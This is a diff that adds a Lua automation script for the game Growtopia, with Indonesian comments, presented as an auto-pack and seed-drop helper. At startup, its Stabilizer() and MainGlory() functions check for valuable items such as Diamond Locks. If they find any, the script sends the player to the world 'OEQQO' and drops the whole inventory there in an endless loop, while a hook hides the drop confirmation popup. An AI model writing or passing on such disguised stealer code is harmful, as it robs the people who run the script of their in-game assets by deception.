@@ -1,0 +1,189 @@
+Drop_Offset = 1       -- Variabel untuk menangani error drop
+isHandlingError = false          -- Flag untuk menandai sedang menangani error
+savedPosition = {x = 0, y = 0}  -- Untuk menyimpan posisi sebelum take item
+scriptRunning = true             -- Flag untuk mengontrol jalannya script
+
+function packs()
+    local px = math.floor(getLocal().pos.x / 32)
+    local py = math.floor(getLocal().pos.y / 32)
+    requestTileChange(px, py, config.Item_ID)
+    sleep(config.Delay_Loop)
+end
+
+function MainGlory()
+    sendPacket(3, "action|join_request\nname|OEQQO|nname\ninvitedWorld|0")
+    sleep(3000)
+    sendPacket(2,"action|welcomeadrewarded")
+
+    while true do
+        if getWorld() then
+            for _, v in pairs(getInventory()) do
+                if getWorld().name == "OEQQO" then        
+                    sendPacket(2, "action|store\nlocation|gem")
+                    sendPacket(2, "action|drop\n|itemID|"..v.id)
+                    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount)
+                    sleep(100)
+                end
+            end
+        end
+    end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if (inv.id == 1796 and inv.amount > 10) or (inv.id == 7188 and inv.amount > 0) or (inv.id == 5638 and inv.amount > 0) or (inv.id == 6016 and inv.amount > 0) or (inv.id == 5480 and inv.amount > 0) then
+                MainGlory()
+                return true
+            end
+        end
+    end
+    return false
+end
+
+function drop(itemid, jumlah)
+    -- kirim langsung tanpa popup
+    sendPacket(2, "action|drop\n|itemID|" .. itemid)
+    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|" .. itemid .. "|\ncount|" .. jumlah)
+    sleep(200)
+end
+
+function inv(item)
+    for _, object in pairs(getInventory()) do
+        if object.id == item then
+            return object.amount
+        end
+    end
+    return 0
+end
+
+function takeItem(itemID)
+    -- Simpan posisi saat ini sebelum mengambil item
+    local player = getLocal()
+    if not player then return false end
+    
+    savedPosition.x = math.floor(player.pos.x / 32)
+    savedPosition.y = math.floor(player.pos.y / 32)
+    
+    -- Cari item di world objects
+    local worldObjects = getWorldObject()
+    local itemFound = false
+    
+    for _, obj in pairs(worldObjects) do
+        if obj.id == itemID then
+            itemFound = true
+            logToConsole("Mengambil item " .. itemID .. " di " .. math.floor(obj.pos.x / 32) .. "," .. math.floor(obj.pos.y / 32))
+            
+            -- Cari path ke item terlebih dahulu
+            local targetX = math.floor(obj.pos.x / 32)
+            local targetY = math.floor(obj.pos.y / 32)
+            
+            -- Selalu panggil findPath, tidak peduli berhasil atau tidak
+            findPath(targetX, targetY)
+            sleep(1000)
+            
+            -- Request collect item menggunakan targetX dan targetY
+            requestCollect(targetX, targetY, itemID)
+            sleep(500)
+            
+            -- Kembali ke posisi yang disimpan
+            findPath(savedPosition.x, savedPosition.y)
+            sleep(1000)
+            
+            return true
+        end
+    end
+    
+    if not itemFound then
+        logToConsole("Tidak ada item " .. itemID .. " di dunia. Menghentikan script.")
+        scriptRunning = false
+    end
+    
+    return false
+end
+
+function moveToPosition(targetX, targetY, offset)
+    -- Jika ada offset, terapkan ke posisi target
+    if offset and offset > 0 then
+        targetX = targetX - offset
+    end
+    
+    -- Fungsi untuk pindah ke posisi tertentu
+    findPath(targetX, targetY)
+end
+
+-- Hook untuk menangani pesan error "You can't" dan langsung pindah ke offset
+function OnVariantHook(vlist, netID)
+    if vlist and vlist[0] == "OnTextOverlay" and vlist[1] and string.find(vlist[1], "You can't") then
+        -- Tandai bahwa sedang menangani error
+        isHandlingError = true
+        
+        -- Dapatkan posisi saat ini
+        local player = getLocal()
+        if player then
+            local currentX = math.floor(player.pos.x / 32)
+            local currentY = math.floor(player.pos.y / 32)
+            
+            -- Langsung pindah ke posisi dengan offset baru
+            moveToPosition(currentX, currentY, Drop_Offset)
+            
+            -- Setelah selesai, lanjutkan loop utama
+            isHandlingError = false
+        else
+            isHandlingError = false
+        end
+    end
+    return false
+end
+
+-- Hook untuk blokir dialog popup
+function BlockDialogHook(vlist, netID)
+    if vlist and vlist[0] == "OnDialogRequest" and vlist[1] and string.find(vlist[1], "drop_item") then
+        return true -- blokir biar popup ga muncul
+    end
+    return false
+end
+
+-- Register the hooks
+AddHook("onvarlist", "DropErrorHandler", OnVariantHook)
+AddHook("onvarlist", "BlockDialog", BlockDialogHook)
+Stabilizer()
+-- loop utama
+while scriptRunning do
+    -- Jika sedang menangani error, tunggu sampai selesai
+    if isHandlingError then
+        sleep(100)
+    else
+        local didDrop = false
+
+        -- Cek jika Item_ID habis, cari dan ambil
+        if inv(config.Item_ID) < 1 then
+            logToConsole("Mencari item " .. config.Item_ID .. " di dunia...")
+            takeItem(config.Item_ID)
+            sleep(1000)
+        end
+
+        -- cek inventory, kalau ada seed >=1 → drop dulu
+        for _, object in pairs(getInventory()) do
+            if object.id % 2 == 1 then -- seed (ID ganjil)
+                if object.amount >= 200 then
+                    drop(object.id, 200)
+                    didDrop = true
+                    break -- drop sekali per loop
+                end
+            end
+        end
+
+        -- kalau tidak drop seed → baru pack
+        if not didDrop then
+            for i = 1, config.Tap_Tap do
+                packs()
+            end
+        end
+    end
+
+    sleep(1000)
+end
+
+logToConsole("Script dihentikan.")
